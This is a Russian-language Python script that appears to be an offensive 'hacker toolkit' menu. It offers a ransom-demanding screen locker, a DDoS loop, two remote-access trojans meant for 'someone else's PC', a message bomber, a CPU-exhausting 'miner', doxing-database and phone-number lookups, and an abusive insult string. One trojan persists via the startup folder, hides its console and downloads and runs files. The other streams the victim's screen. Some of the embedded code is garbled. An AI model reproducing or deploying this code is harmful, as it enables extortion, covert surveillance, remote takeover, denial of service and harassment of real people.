from colorama import init, Fore, Style
from telethon import TelegramClient
import requests
from bs4 import BeautifulSoup

def get_public_tg_info(username: str):
    url = f"https://t.me/{username}"
    resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    if resp.status_code == 404:
        print("❌ Пользователь не найден (404).")
        return

    soup = BeautifulSoup(resp.text, "html.parser")

    title = soup.find("meta", property="og:title")
    full_name = title["content"] if title else "Не указано"

    desc = soup.find("meta", property="og:description")
    bio = desc["content"] if desc else "Нет биографии"

    has_photo = bool(soup.find("img", class_="tgme_page_photo_image"))

    print(f"[+] Юзернейм: @{username}")
    print(f"[+] Полное имя: {full_name}")
    print(f"[+] Био: {bio}")
    print(f"[+] Фото профиля: {'Есть' if has_photo else 'Отсутствует'}")

def format_result(data: str):
    print(data)

def search_by_htmlweb(phone: str):
    import requests
    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
    res = requests.get(url, timeout=10)
    data = res.json()

    if '0' in data:
        info = data['0']
        country = data.get("country", {}).get("name", "Не найдено")
        region = data.get("region", {}).get("name", "Не найдено")
        operator = info.get("oper", "Не найдено")
        telcod = info.get("telcod", "Не найдено")
        latitude = info.get("latitude", "Не найдено")
        longitude = info.get("longitude", "Не найдено")
        time_zone = info.get("time_zone", "Не найдено")
        tz = info.get("tz", "Не найдено")
        mobile = "Мобильный" if info.get("mobile", False) else "Стационарный"
        operator_brand = info.get("oper_brand", "Не найдено")
        def_range = info.get("def", "Не найдено")
        country_fullname = data.get("country", {}).get("fullname", "Не найдено")
        country_english = data.get("country", {}).get("english", "Не найдено")
        country_code3 = data.get("country", {}).get("country_code3", "Не найдено")
        country_iso = data.get("country", {}).get("iso", "Не найдено")
        country_telcod = data.get("country", {}).get("telcod", "Не найдено")
        country_location = data.get("country", {}).get("location", "Не найдено")
        country_capital = data.get("country", {}).get("capital", "Не найдено")
        country_mcc = data.get("country", {}).get("mcc", "Не найдено")
        country_lang = data.get("country", {}).get("lang", "Не найдено")
        country_langcod = data.get("country", {}).get("langcod", "Не найдено")
        region_id = data.get("region", {}).get("id", "Не найдено")
        region_okrug = data.get("region", {}).get("okrug", "Не найдено")
        region_autocod = data.get("region", {}).get("autocod", "Не найдено")
        region_capital = data.get("region", {}).get("capital", "Не найдено")
        region_english = data.get("region", {}).get("english", "Не найдено")
        region_iso = data.get("region", {}).get("iso", "Не найдено")

        result = f"""
 ██▓███   ▄▄▄       ██▀███   ▄▄▄      ▓█████▄  ▒█████  ▒██   ██▒
▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░
▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌▒██░  ██▒░░  █   ░
▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ 
▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░ ████▓▒░▒██▒ ▒██▒
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░
░░         ░   ▒     ░░   ░   ░   ▒    ░ ░  ░ ░ ░ ░ ▒   ░    ░  
               ░  ░   ░           ░  ░   ░        ░ ░   ░    ░  
                                       ░  

[!]запрос -> {phone}                                               
[+]Страна -> {country}
[+]Полное название страны -> {country_fullname}
[+]Название страны на английском -> {country_english}
[+]Код страны (3 символа) -> {country_code3}
[+]ISO код страны -> {country_iso}
[+]Телефонный код страны: ->{country_telcod}
[+]Локация страны -> {country_location}
[+]Столица страны -> {country_capital}
[+]MCC страны -> {country_mcc}
[+]Язык страны -> {country_lang}
[+]Код языка страны -> {country_langcod}
[+]Регион -> {region}
[+]ID региона -> {region_id}
[+]Округ региона -> {region_okrug}
[+]Автокод региона -> {region_autocod}
[+]Столица региона -> {region_capital}
[+]Название региона на английском: {region_english}
[+]ISO код региона -> {region_iso}
[+]Оператор -> {operator}
[+]Код оператора -> {telcod}
[+]Широта -> {latitude}
[+]Долгота -> {longitude}
[+]Часовой пояс -> {time_zone}
[+]Временная зона -> {tz}
[+]Тип -> {mobile}
[+]Бренд оператора -> {operator_brand}
[+]Диапазон DEF -> {def_range}                                                                                                                                   
"""
        return result
    else:
        return "Данных по номеру не найдено."
    
print(Fore.GREEN + """
            000   00     000       000     00              0000000000000000
            000  00      000       000     00              000          000
            000 00       000       000     00              000          000
            0000         000       000     00              0000000000000000
            0000         000       000     00              000          000
            000 00       000       000     00              000          000
            000  00      0000000000000     00000000000     000          000
      """)
print(Fore.GREEN + """
                                       функционал:
 _____________________________________________________________________________________________________
| [1] - осинт    [2] - бд поиск    [3] - Ddos    [4] - винлокер с откупом   [5] - рат с запуском      |
| приложений   [6] - рат без запуска приложений, но с отслеживанием экрана                            |
| [7] - информация о себе   [8] - vpn   [9] - информация о инструменте   [10] - бомбер сообщениями    |
| [11] - установить библиотеку если через pip install не получается   [12] - майнер   [13] -          |
| cоздать окно   [14] - windows cmd(например если у вас линукс)   [15] - поиск по номеру  [16] -      |
| троллинг   [17] - поиск по тг   [18] - выход                                                        |
|_____________________________________________________________________________________________________|
      """)
num = input("[?] введите номер функции: ") 
if num == "1":
    import webbrowser
    print(Fore.GREEN + """
          доступные соцсети:
          телеграм
          тик ток
          гугл(поиск во всех соцсетях) 
          или вы можете сделать поиск по номеру телефона(чтобы это сделать введите слово телефон)
          """)
    soc = input("введите соцсеть или введите слово телефон: ")
    if soc == "телеграмм":
        nic = input("введите юзернейм: ")
        search_url = f"https://www.google.com/search?q=telegramm {nic}"
        webbrowser.open(search_url)
    elif soc == "тик ток":
        nic2 = input("введите юзернейм с @: ")
        search_url = f"https://www.google.com/search?q=tik tok {nic2}"
        webbrowser.open(search_url)
    elif soc == "гугл":
        nic3 = input("введите ник или юзернейм из любой соцсети: ")
        search_url = f"https://www.google.com/search?q={nic3}"
        webbrowser.open(search_url)
    elif soc == "телефон":
        url = "https://www.kody.su/check-tel#text"
        webbrowser.open(url)
elif num == "2":
    import sqlite3
    import time
    print("в коде замените данные на вашу бд(путь, столбец и т.д)")
    conn = sqlite3.connect(r"C:\Users\User\Downloads\doxkit.db")
    cursor = conn.cursor()

    def найти_совпадения(ключевое_слово):
        cursor.execute("SELECT * FROM dox WHERE name LIKE ?", ('%' + ключевое_слово + '%',))
        результаты = cursor.fetchall()
        return результаты

    ключ = input("Введите часть имени или слова для поиска: ")
    совпадения = найти_совпадения(ключ)

    if совпадения:
        print("Найден(ы):")
        for совпадение in совпадения:
            print(совпадение)
            time.sleep(10)
            print
    else:
        print("Совпадений не найдено")
        time.sleep(10)
        print

elif num == "3":
    import http.client
    
    host = input("введите адрес сайта: ")
    path = "/"

    conn = http.client.HTTPConnection(host)
    while True:
     try:
         conn.request("GET", path)
         response = conn.getresponse()
         print(f"Код ответа: {response.status}")
         data = response.read()
         print("Ответ получен успешно.")
     except Exception as e:
         print(f"Ошибка: {e}")

elif num == "4":
    pas = input("введите пароль для винлокера: ")
    nik = input("введите куда написать для откупа: ")
    cem = input("введите кем будет заблокан виндовс: ")
    import tkinter as tk
    import os
    from tkinter import messagebox
    import ctypes
    import time

    print(r"""
error: ox0374582
error: 0x34769432
error: 0x017238""")
    time.sleep(1)
    print(r"""error: 0x675825637
error: 0x63836426""")
    time.sleep(0.5)
    print('Ecryptor started')
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
            ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::;;::: ;::#               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
      """)

    time.sleep(0.5)

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def check_input(event=None):
        user_input = entry.get().strip() 
        if user_input == f"{pas}":  
            messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
            root.destroy() 
        else:
             messagebox.showinfo("упс!", "неверный пароль!")

    root = tk.Tk()
    root.title("black hat winlocker")

    root.attributes("-fullscreen", True)
    root.configure(bg="blue")
    root.attributes("-topmost", True)

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text=f"ваш виндовс заблокирован {cem}", foreground="white", background="blue", font=("Arial", 35))
    label.pack(pady=20)

    entry = tk.Entry(root, show="*", width=30, font=("Arial", 25))
    entry.pack(pady=10)

    entry.bind("<Return>", check_input)

    button = tk.Button(root, text="подтвердить", command=check_input)
    button.pack(pady=5)

    label = tk.Label(
        root,
        text="вас заметили",
        foreground="white",        
        background="blue",  
        font=("Arial", 70),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text="👁",
        foreground="white",        
        background="blue",  
        font=("Arial", 70),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text="""
    упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
    пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
    Любая попытка обхода вируса карается повторным запуском вируса!""",
        foreground="white",        
        background="blue",  
        font=("Arial", 30),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text=f"""
    для откупа вы можете связатся с нами
    писать нужно в социальную сеть telegram
    юзернейм автора {nik}""",
        foreground="white",        
        background="blue",  
        font=("Arial", 30),
        padx=10,
        pady=10
    )

    label.pack()

    root.mainloop()

elif num == "5":
    print("код для чужого пк:")
    print("""import socket
import threading
import ctypes
import time
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser
import shutil
import sys

window_67 = None
window_block = None

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
         print("ошибка автозагрузки!")

def safe_shutdown_windows(delay_seconds=0):
    try:
        # shutdown /s — выключение; /t — задержка в сотнях миллисекунд; /f — принудительное закрытие программ
        cmd = ['shutdown', '/s', '/t', str(delay_seconds * 1), '/f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Выключение запланировано через delay_seconds} секунд")
        else:
            print(f"Ошибка: result.stderr}")
    except Exception as e:
        print(f"Исключение: e}")

def win_error(title, msg):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, msg)
    root.destroy()

MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

def move_cursor(x, y):
    
    ctypes.windll.user32.SetCursorPos(x, y)

def download_and_run_app(client_socket, file_data, filename):
    
    try:
        # Сохраняем файл во временную директорию
        temp_path = os.path.join(os.getcwd(), 'temp')
        os.makedirs(temp_path, exist_ok=True)
        file_path = os.path.join(temp_path, filename)

        with open(file_path, 'wb') as f:
            f.write(file_data)

        # Запускаем файл
        if filename.lower().endswith('.exe'):
            subprocess.Popen([file_path])
            return f"Приложение filename} запущено"
        elif filename.lower().endswith(('.py', '.pyw')):
            subprocess.Popen(['python', file_path])
            return f"Скрипт filename} запущен"
        else:
            # Для других типов файлов пытаемся открыть стандартными средствами ОС
            os.startfile(file_path)
            return f"Файл 
          filename} открыт"
    except Exception as e:
        return f"Ошибка при скачивании/запуске: {str(e)}"

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Получена команда: {data}")
            if data.startswith('download_run:'):
                # Формат: download_run:имя_файла:данные_в_hex
                parts = data.split(':', 2)
                if len(parts) == 3:
                    filename = parts[1]
                    file_data_hex = parts[2]
                    try:
                        file_data = bytes.fromhex(file_data_hex)
                        response = download_and_run_app(client_socket, file_data, filename)
                    except ValueError:
                        response = "Ошибка: неверные данные файла (не hex)"
                else:
                    response = "Ошибка: неверный формат команды"
            else:
                response = execute_command(data)

            client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print(f"Ошибка обработки клиента: {e}")
            break
    client_socket.close()

def execute_command(cmd):
    global window_67, window_block
    if cmd == "курсор":
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
    elif cmd == "выкл пк":
        safe_shutdown_windows(3)
    elif cmd == "сообщение":
        win_error("сообщение", "сообщение от некого приложения)")
    elif cmd == "калькулятор":
        os.system('calc')
    elif cmd == "диспетчер задач":
        os.system('taskmgr')
    elif cmd == "блокнот":
        os.system('notepad')
    elif cmd == "проводник":
        os.system('explorer')
    elif cmd == "cmd":
        os.system('cmd')
    elif cmd == "paint":
        os.system('mspaint')
    elif cmd == "панель управления":
        os.system('control')
    elif cmd == "клавиатура":
        os.system('osk')
    elif cmd == "гугл":
        url = "https://www.google.com"
        webbrowser.open(url)
    elif cmd == "покойо":
        url == "https://www.pocoyo.com"
        webbrowser.open(url)
    elif cmd == "18+":
        url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
        webbrowser.open(url)
    elif cmd == "67":
        if window_67 is None or not window_67.winfo_exists():
            window_67 = tk.Toplevel()
            window_67.title("67")
            window_67.geometry("400x300")
            label = tk.Label(window_67, text="67", foreground="white", background="blue", font=("Arial", 35))
            label.pack(pady=20)
    elif cmd == "блок":
        if window_block is None or not window_block.winfo_exists():
            window_block = tk.Toplevel()
            window_block.title("Блок")
            window_block.geometry("1980x1200")
            window_block.attributes("-fullscreen", True)
            window_block.attributes("-topmost", True)
            window_block.protocol("WM_DELETE_WINDOW", lambda: None)
            label = tk.Label(window_block, text="Вас заметили 👁", foreground="white", background="black", font=("Arial", 50))
            label.pack(expand=True, fill=tk.BOTH)
    else:
        win_error("сообщение", f"{cmd}")

root = tk.Tk()
root.withdraw()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 8888))
server.listen(5)
print("Сервер запущен, ожидает команд...")

def start_server():
 while True:
    client, addr = server.accept()
    print(f"Подключение от {addr}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

root.mainloop()
""")
    print("не забывайте в начале некоторых мест ставить {")
    print("код на ваш пк: ")
    print("""
import socket

def send_command_to_server(command):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(('localhost', 8888))
        client.send(command.encode())
        print(f"Команда 'command}' отправлена на сервер")
    except ConnectionRefusedError:
        print("Сервер не запущен")
    finally:
        client.close()

def send_file_to_server(filepath, filename):
    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
        # Конвертируем в hex для передачи в текстовом протоколе
        file_data_hex = file_data.hex()
        command = f"download_run:filename}:file_data_hex}"
        send_command_to_server(command)
    except FileNotFoundError:
        print(f"Файл filepath} не найден")
    except Exception as e:
        print(f"Ошибка чтения файла: e}")

while True:
    cmd = input("Команда для отправки или введите сообщение которое хотите отправить: ")
    if cmd == 'exit':
        break
    send_command_to_server(cmd)""")

elif num == "6":
    print("код для чужого пк: ")
    print("""import socket
import cv2
import numpy as np
import pyautogui

HOST = '0.0.0.0'  
PORT = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print("Ожидание соединения...")

conn, addr = server_socket.accept()
print(f"Подключение от {addr}")

try:
    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 50]
        result, imgencode = cv2.imencode('.jpg', frame, encode_param)
        data = imgencode.tobytes()
        size = len(data)
        conn.sendall(size.to_bytes(4, 'big'))
        conn.sendall(data)
except Exception as e:
    print("Ошибка:", e)
finally:
    conn.close()
    server_socket.close()""")
    print("код для вашего пк: ")
    print("""import socket
import cv2
import numpy as np

HOST = 'ваш айпи'  
PORT = 9999

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

try:
    while True:
        size_data = client_socket.recv(4)
        if not size_data:
            break
        size = int.from_bytes(size_data, 'big')
        data = b''
        while len(data) < size:
            data += client_socket.recv(size - len(data))
        nparr = np.frombuffer(data, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        cv2.imshow('Remote Screen', img)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
except KeyboardInterrupt:
    pass
finally:
    client_socket.close()
    cv2.destroyAllWindows() """)
    print("нужны библиотеки pyautogui, open-cv, numpy")
    time.sleep(10)
    print
elif num == "7":
    import platform
    import os
    import time

    system = platform.system()  # ОС (Windows, Linux, Darwin - для Mac)
    release = platform.release()  # Версия ОС
    version = platform.version()  # Дополнительная версия
    machine = platform.machine()  # Модель машины (например, x86_64)
    node = platform.node()  # Имя компьютера
    processor = platform.processor()  # Процессор
    user_name = os.getlogin()

    time.sleep(2)
    print(f"Операционная система: {system} {release}")
    print(f"Версия ОС: {version}")
    print(f"Модель процессора: {processor}")
    print(f"Имя компьютера: {node}")
    print(f"Имя пользователя: {user_name}")
    print(f"Модель машины: {machine}")
    time.sleep(10)
    print("hello world")
elif num == "8":
    import os
    os.system('start ADGuardVPN.exe')
elif num == "9":
    import time
    print("название: kula")
    print("создатель: k9gy")
    time.sleep(10)
    print
elif num == "10":
    for i in range(500000000):
        os.system('wscript space_test.vbs')
elif num == "11":
    import subprocess
    import sys

    def install_package(package):
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

    packages = input("введите название библиотеки: ")

    for package in packages:
        install_package(package)
elif num == "12":
    import multiprocessing
    import time
    import tkinter as tk


    def cpu_worker():
     while True:
        x = 0
        for i in range(1000000):
            x += i ** 2
        time.sleep(0.001)

    def load_all_cpu_cores():
     num_cores = multiprocessing.cpu_count()
     processes = []

     for _ in range(num_cores):
        p = multiprocessing.Process(target=cpu_worker)
        p.start()
        processes.append(p)

     for p in processes:
        p.join()

    load_all_cpu_cores()
elif num == "13":
    import tkinter as tk
    root = tk.Tk()
    root.title("окно kula")
    root.geometry("400x300")
    label = tk.Label(root, text="окно kula", foreground="white", background="blue", font=("Arial", 35))
    label.pack(pady=20)
    root.mainloop()
elif num == "14":
    import os
    os.system('cmd')
elif num == "17":
    usr = input("Введите Telegram‑юзернейм (без @): ").strip().lstrip("@")
    get_public_tg_info(usr)
elif num == "15":
    import time
    phone_number = input("введите номер телефона: ")
    result = search_by_htmlweb(phone_number)
    format_result(result)
    time.sleep(10)
    
elif num == "16":
    import time
    print("ты мразота тупая будешь впитывать мои оскорбления как твоя мать еду с холодильника блять пидр ты ебучий у которого семьи нету олух")
    time.sleep(10)
    print
elif num == "18":
    import sys
    sys.exit()
else:
    print("[?]не известная команда!") 